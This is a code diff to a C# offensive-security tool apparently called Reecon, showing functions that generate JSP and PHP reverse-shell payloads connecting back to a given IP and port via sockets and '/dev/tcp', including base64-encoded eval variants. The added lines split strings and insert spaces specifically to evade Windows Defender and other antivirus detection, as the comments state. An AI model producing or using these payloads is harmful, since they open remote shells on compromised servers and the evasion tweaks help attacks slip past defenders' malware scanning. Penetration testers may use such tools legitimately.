@@ -100,6 +100,7 @@ namespace Reecon
         private static string JSPShell(string ip, string port)
         {
             // Lots of spaces else Windows Defender complains about "Trojan:JS/Foretype.A!ml"
+            // Even more spaces - It's gotten better....
             return "<%@page import=\"java.lang.* \"%>" + "<%@page import=\"java.util.* \"%><%@page import=\"java.io.* \"%><%@page import=\"java.net.* \"%><% class StreamC" + "onnector extends Thread {" + " InputStream is; Outpu" + "tStream os; StreamConnector( InputStre" + "am is, OutputStream os ) { this.is = is; this.os = os; }" + " public void run() { Buffere" + "dReader in = null; BufferedWriter out = null; try { in = new Buffered" + "Reader( new InputStreamReader( this.is ) ); out = " + "new BufferedWriter( new OutputStreamWriter( this.os ) ); char bu" + "ffer[] = new char[8192]; int lengt" + "h; while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) { out" + ".write( buffer, 0, length ); out.flush(); } } catch( Exception e ){} try {" + " if( in != null ) in.close(); if( out != null ) " + "out.close(); } catch( Exception e ){} } } try {" + Environment.NewLine
                     + "Socket so" + "cket = new Socket(\"" + ip + "\", " + port + ");" + Environment.NewLine
                     + "String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) { ShellPath = new String(\"/bin/sh\"); } else { ShellPath = new String(\"cmd.exe\"); } "
@@ -124,7 +125,9 @@ namespace Reecon
         {
             string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
             string b64Shell = System.Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
-            string evalShell = "eval(base64_decode('" + b64Shell + "'));";
+            // Space is to bypass Windows Defender definitions
+            // Still gets picked up by "bkav" though - Will deal with later if needed
+            string evalShell = "eva" + "l(base64_decode('" + b64Shell + "'));";
             return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
                 + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
                 + "No Upload: php -r \"" + evalShell + "\"";
